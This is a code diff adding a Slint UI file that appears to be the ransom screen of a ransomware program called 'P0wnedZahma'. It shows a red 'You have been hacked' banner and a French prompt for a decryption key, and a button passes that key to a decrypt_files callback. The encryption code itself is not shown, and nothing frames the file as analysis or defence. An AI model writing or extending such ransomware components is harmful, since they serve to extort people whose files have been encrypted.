@@ -1,0 +1,55 @@
+import { SpinBox, Button, CheckBox, Slider, LineEdit, ScrollView, ListView,
+HorizontalBox, VerticalBox, GridBox, StandardButton, Palette } from "std-widgets.slint";
+
+export component UI inherits Window {
+    title: "P0wnedZahma";
+    preferred-width: 400px;
+    preferred-height: 600px;
+    property <string> res: "";
+    property <bool> show-popup: false;
+    property <string> popup-text: "";
+    callback show_res_popup;
+    show_res_popup => { res_popup.show(); }
+    callback decrypt_files(string) -> string;
+    res_popup := PopupWindow {
+        x: 40px;
+        y: 100px;
+        width: min(confirm_popup_layout.preferred-width, root.width - 80px);
+        confirm_popup_layout := Dialog {
+            height:100%; width: 100%;
+            confirm_popup_text := Text {
+                text: root.popup-text; 
+                wrap: word-wrap;
+            }
+            StandardButton { kind: close; }
+        }
+    }
+
+    VerticalBox {
+        padding: 10px;
+        spacing: 10px;
+        
+        Text {
+            text: "You have been hacked";
+            font-size: 24px;
+            color: #ff0000;
+            horizontal-alignment: center;
+            wrap: word-wrap;
+        }
+        
+        text-edit := LineEdit {
+            placeholder-text: "Fournissez la clé de décryptage";
+        }
+
+        btn := Button {
+            text: "Décryptez";
+            enabled: text-edit.text != "";
+            clicked => {
+                root.res = root.decrypt_files(text-edit.text);
+                root.popup-text = root.res;
+                root.show_res_popup();
+                text-edit.text = "";
+            }
+        }
+    }
+}
